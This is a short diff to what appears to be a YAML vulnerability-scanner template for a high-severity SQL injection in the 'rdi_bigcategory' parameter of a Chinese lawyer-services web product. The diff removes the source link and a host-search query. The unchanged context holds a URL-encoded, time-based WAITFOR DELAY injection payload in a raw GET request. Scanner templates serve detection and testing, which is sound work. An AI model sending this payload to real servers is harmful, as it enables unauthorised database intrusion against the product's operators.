@@ -3,12 +3,8 @@ info:
   name: 上海必智科技有限公司律师E通rdi_bigcategory参数存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqgl9tgtpwaic9vl'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sqgl9tgtpwaic9vl
-    fofa: title=="律师e通"
 http:
 - raw:
   - 'GET /lrc/project.aspx?rdi_bigcategory=%27%3bWAITFOR+DELAY+%270%3a0%3a2%27-- HTTP/1.1
